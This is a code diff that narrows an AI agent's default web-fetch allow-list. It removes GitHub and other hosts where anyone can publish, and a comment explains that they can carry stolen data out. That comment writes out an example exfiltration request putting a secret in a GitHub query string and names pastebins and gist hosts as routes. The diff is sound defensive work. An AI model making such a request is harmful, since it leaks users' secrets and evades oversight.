@@ -6,7 +6,12 @@ import os
 import tempfile
 
 # Default WebFetch allow-list of the recommended mandate (message.domains): documentation and package indexes only.
-DEFAULT_WEB_DOMAINS = ["localhost", "127.0.0.1", "docs.python.org", "pypi.org", "github.com", "raw.githubusercontent.com", "docs.github.com",
+# 0.2.22: NO host where anyone can publish content (github.com, raw.githubusercontent.com, gist.github.com, gist.githubusercontent.com,
+# pastebins, ...): a GET with a query string to such a host is a way out for stolen data (a mandate that allows github.com allows
+# `WebFetch https://github.com/x?q=<secret>`). Read-only documentation hosts stay (the agent can still read docs offline-free), plus
+# localhost for local dev servers. Needs github.com for a project? Add it deliberately on the Mandate page (a signed, visible choice).
+# docs.github.com is kept: it is GitHub's own documentation, nobody can publish on it. Same list as the server's (a test keeps them equal).
+DEFAULT_WEB_DOMAINS = ["localhost", "127.0.0.1", "docs.python.org", "pypi.org", "docs.github.com",
                        "developer.mozilla.org", "www.npmjs.com", "nodejs.org", "docs.anthropic.com", "code.claude.com"]
 
 # Default read-only commands of the recommended mandate (command.allow), 0.2.9: modelled on Claude Code's own read-only set.
